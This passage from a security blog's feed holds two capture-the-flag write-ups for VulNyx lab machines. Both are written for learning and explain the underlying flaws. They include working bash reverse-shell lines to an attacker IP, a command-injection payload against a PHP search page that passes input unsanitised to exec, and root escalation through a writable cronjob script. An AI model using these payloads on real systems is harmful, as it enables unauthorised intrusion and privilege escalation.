  &lt;li&gt;The word &lt;em&gt;root&lt;/em&gt; specifies the user under which the task will be executed.&lt;/li&gt;
  &lt;li&gt;The word &lt;em&gt;/bin/sh&lt;/em&gt; is the path to the shell interpreter that will be used to execute the script.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;/home/candidate/.scripts/makeBackup.sh&lt;/em&gt; is the path of the script to be executed during the task.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In a nutshell, &lt;strong&gt;the script &lt;em&gt;/home/candidate/.scripts/makeBackup.sh&lt;/em&gt; is executed every minute by the &lt;em&gt;root&lt;/em&gt; user&lt;/strong&gt;. In this case there is no reason for the cronjob to be executed with the &lt;em&gt;root&lt;/em&gt; user because all the directories involved are accessible with the &lt;em&gt;candidate&lt;/em&gt; user. However, it is not uncommon to find this type of configuration due to carelessness and convenience of the sysadmins because the &lt;em&gt;root&lt;/em&gt; user will never throw a permissions denied.&lt;/p&gt;

&lt;p&gt;If we combine this with the fact that, as we saw before, &lt;strong&gt;the &lt;em&gt;makeBackup.sh&lt;/em&gt; script has read, write and execute permissions for all users&lt;/strong&gt;, we are 100% sure that we already have a vector to escalate privileges to &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-getting-a-shell-as-root&quot;&gt;3.2. Getting a shell as root&lt;/h2&gt;

&lt;p&gt;The strategy now is to execute a shell of the type&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;/bin/bash
&lt;span class=&quot;gp&quot;&gt;bash -c &apos;bash -i &amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.0.2.15/1235 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;&apos;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Setting up a listener on the attacking machine on port 1235&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;nc -nlvp 1235
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and then executing the following code on the target machine&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;/home/candidate/.scripts
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#/bin/bash&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.2.15/1235 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; makeBackup.sh
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;makeBackup.sh
&lt;span class=&quot;gp&quot;&gt;-e #&lt;/span&gt;/bin/bash
&lt;span class=&quot;gp&quot;&gt;bash -c &apos;bash -i &amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.0.2.15/1235 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;&apos;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a few seconds (at the most you have to wait 1 minute), we receive the &lt;em&gt;root&lt;/em&gt; shell&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1235 
&lt;span class=&quot;go&quot;&gt;listening on [any] 1235 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.20] 47866
bash: cannot set terminal process group (3479): Inappropriate ioctl for device
bash: no job control in this shell
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@Diff3r3ntS3c:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;whoami
root
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@Diff3r3ntS3c:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;pwd
/root
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@Diff3r3ntS3c:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;ls
root.txt
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and we can see that the root flag is in &lt;em&gt;/root/root.txt&lt;/em&gt;.&lt;/p&gt;

&lt;div id=&quot;section-id-3-3&quot; /&gt;

&lt;h2 id=&quot;33-why-does-this-privilege-escalation-via-cronjob-exist&quot;&gt;3.3. Why does this privilege escalation via cronjob exist?&lt;/h2&gt;

&lt;p&gt;This method worked because 2 conditions were met at the same time:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The cronjob is executed with the &lt;em&gt;root&lt;/em&gt; user.&lt;/li&gt;
  &lt;li&gt;The script that runs the cronjob is editable by any user.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Both conditions are necessary to perform this privilege escalation.&lt;/strong&gt; To understand it better, let’s think what would happen if one of the 2 conditions were not met:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;If the cronjob is not executed as &lt;em&gt;root&lt;/em&gt; user but for example with the &lt;em&gt;candidate&lt;/em&gt; user, then even if we could modify the script &lt;em&gt;makeBackup.sh&lt;/em&gt;, we would get a shell with the &lt;em&gt;candidate&lt;/em&gt; user.&lt;/li&gt;
  &lt;li&gt;If the script that is executed is not editable by any user then there is no way to intervene in the cronjob execution flow, at least by directly editing the script. The only thing we could do is to look for other scripts or functionalities that allow to write in the &lt;em&gt;makeBackup.sh&lt;/em&gt; script to inject code in the cronjob. This is too specific and does not have to happen.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="ctf" /><category term="vulnyx" /><category term="nmap" /><category term="web" /><category term="burpsuite" /><category term="arbitrary file upload" /><category term="ffuf" /><category term="directory listing" /><category term="command injection" /><category term="cronjob" /><summary type="html">Writeup of the machine Diff3r3ntS3c from VulNyx.</summary></entry><entry><title type="html">VulNyx: HackingStation</title><link href="https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation/" rel="alternate" type="text/html" title="VulNyx: HackingStation" /><published>2024-03-31T00:00:00+01:00</published><updated>2024-03-31T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Port and service scanning&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Gaining access&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-2-1&quot;&gt;2.1. Detecting the command injection&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-2-2&quot;&gt;2.2. Getting a shell as hacker&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-2-3&quot;&gt;2.3. Why does this command injection exist?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Privilege escalation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Detecting the nmap vulnerability&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Getting a shell as root&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-3&quot;&gt;3.3. Why does this privilege escalation via nmap exist?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/2024-03-31-vulnyx-hackingstation/box-info.png&quot; style=&quot;width: 750px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this post we are going to see the writeup of the machine HackingStation from &lt;a href=&quot;https://vulnyx.com/&quot;&gt;VulNyx&lt;/a&gt;. It’s a low machine created by &lt;a href=&quot;https://blog.hackcommander.com/&quot;&gt;HackCommander&lt;/a&gt; (yeah, it’s me :blush:) made in PHP without framework and especially designed for beginners. We are going to get access to the machine through a command injection in a web and then to escalate privileges through the nmap binary, which is allowed to run as superuser without password.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-port-and-service-scanning&quot;&gt;1. Port and service scanning&lt;/h2&gt;

&lt;p&gt;After running a port scan&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 10000 10.0.2.17 
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-30 21:39 CET
Nmap scan report for 10.0.2.17
Host is up (0.00010s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we can see that the port 80 is open and therefore there is a web. Now running a service scan&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.0.2.17     
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-30 21:39 CET
Nmap scan report for 10.0.2.17
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: HackingStation

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we can see that there is a webserver &lt;em&gt;Apache httpd 2.4.57&lt;/em&gt; running on Debian, but before looking for CVEs it is better to take a look at the web.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-gaining-access&quot;&gt;2. Gaining access&lt;/h2&gt;

&lt;div id=&quot;section-id-2-1&quot; /&gt;

&lt;h2 id=&quot;21-detecting-the-command-injection&quot;&gt;2.1. Detecting the command injection&lt;/h2&gt;

&lt;p&gt;After accessing the web in &lt;em&gt;http://10.0.2.17/&lt;/em&gt;, we can see that there is an exploit search functionality.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-31-vulnyx-hackingstation/web-index.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For example, searching the term &lt;em&gt;Liferay&lt;/em&gt;, yields the following result&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-31-vulnyx-hackingstation/liferay-search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The output is a list of exploits for the product &lt;em&gt;Liferay&lt;/em&gt;, but it seems to be a functionality under development because the result is not well formatted. Also considering that the word &lt;em&gt;searchsploit&lt;/em&gt; appears in the output, it seems quite likely that the site is running the searchsploit console tool in the backend.&lt;/p&gt;

&lt;p&gt;If this is happening and the backend doesn’t sanitize the input data, there could be a &lt;a href=&quot;https://portswigger.net/web-security/os-command-injection&quot;&gt;command injection&lt;/a&gt;. During command injection exploitation it is very common to attempt to concatenate commands with the character ;. In this case, the following input&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Liferay;whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;yields the following result&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-31-vulnyx-hackingstation/whoami-search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The result contains at the end the word &lt;em&gt;hacker&lt;/em&gt;, which must be the user with which is running the application, so it is confirmed that &lt;strong&gt;the web is vulnerable to command injection&lt;/strong&gt;.&lt;/p&gt;

&lt;div id=&quot;section-id-2-2&quot; /&gt;

&lt;h2 id=&quot;22-getting-a-shell-as-hacker&quot;&gt;2.2. Getting a shell as hacker&lt;/h2&gt;

&lt;p&gt;Now is the time to get a shell. First we set up a listener on the attacking machine on port 8000 using the command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;nc -nlvp 8000
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and then send the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Liferay;bash -c &apos;bash -i &amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.0.2.15/8000 0&amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;1&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After this, we get a shell with the &lt;em&gt;hacker&lt;/em&gt; user and that the user flag is in &lt;em&gt;/home/hacker/user.txt&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 8000
&lt;span class=&quot;go&quot;&gt;listening on [any] 8000 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.17] 56646
bash: cannot set terminal process group (508): Inappropriate ioctl for device
bash: no job control in this shell
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/var/www/html$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;whoami
hacker
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/var/www/html$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/hacker
&lt;span class=&quot;go&quot;&gt;cd /home/hacker
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/home/hacker$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;ls
snap
user.txt
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div id=&quot;section-id-2-3&quot; /&gt;

&lt;h2 id=&quot;23-why-does-this-command-injection-exist&quot;&gt;2.3. Why does this command injection exist?&lt;/h2&gt;

&lt;p&gt;As we saw in the captures above, the vulnerability is in the script &lt;em&gt;exploitQuery.php&lt;/em&gt;. If we check the content of the script&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/home/hacker$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/html
&lt;span class=&quot;go&quot;&gt;cd /var/www/html
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/var/www/html$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;ls
exploitQuery.php
hacker.jpg
index.html
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/var/www/html$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;exploitQuery.php
&lt;span class=&quot;go&quot;&gt;cat exploitQuery.php
&amp;lt;?php
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;   exec(&apos;searchsploit -wj &apos; . $&lt;/span&gt;_GET[&lt;span class=&quot;s1&quot;&gt;&apos;product&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$results&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;   $&lt;/span&gt;json_string &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; json_encode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$results&lt;/span&gt;, JSON_PRETTY_PRINT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;   echo &apos;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; . $json_string . &apos;&lt;/span&gt;&amp;lt;/pre&amp;gt;&lt;span class=&quot;s1&quot;&gt;&apos;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we can see that &lt;strong&gt;the product parameter is passed without sanitization to an &lt;a href=&quot;https://www.php.net/manual/en/function.exec.php&quot;&gt;exec&lt;/a&gt; PHP function&lt;/strong&gt;, so there is a command injection. For example, when we send the payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Liferay
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the backend executes the following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;searchsploit -wj Liferay
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, when we send the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Liferay;whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the backend executes the following commands&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;searchsploit -wj Liferay;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this way, first is executed the command &lt;em&gt;searchsploit -wj Liferay&lt;/em&gt; and then the command &lt;em&gt;whoami&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;It is not recommended to use functions to execute system commands, and if there is no other option, it is mandatory to validate or sanitize the input before passing it to the function.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-privilege-escalation&quot;&gt;3. Privilege escalation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-detecting-the-nmap-vulnerability&quot;&gt;3.1. Detecting the nmap vulnerability&lt;/h2&gt;

&lt;p&gt;After examining the home directory of the &lt;em&gt;hacker&lt;/em&gt; user, there is nothing unusual or suspicious. Returning to the web index we can see that it says the following message&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Coming soon to HackingStation... NMAP!!!!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nmap requires superuser permissions for certain use cases so it wouldn’t be strange that, if they are working on developing some web functionality with nmap, they left some misconfigurations about the nmap binary.&lt;/p&gt;

&lt;p&gt;The following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;sudo -l
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;checks the &lt;em&gt;/etc/sudoers&lt;/em&gt; file (or any other file specified by the sudoers configuration) to determine what commands and actions are allowed to be executed with elevated privileges via &lt;em&gt;sudo&lt;/em&gt;. The result of this command is&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/home/hacker$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;sudo -l
Matching Defaults entries for hacker on HackingStation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User hacker may run the following commands on HackingStation:
    (root) NOPASSWD: /usr/bin/nmap
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;so we can execute nmap as root with sudo without password. This doesn’t sound very safe.&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-getting-a-shell-as-root&quot;&gt;3.2. Getting a shell as root&lt;/h2&gt;

&lt;p&gt;Searching in &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nmap/#sudo&quot;&gt;GTFOBins&lt;/a&gt; we get the following result&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-31-vulnyx-hackingstation/gtfobins.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Checking the version of nmap&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/home/hacker$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;nmap -V
Nmap version 7.93 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
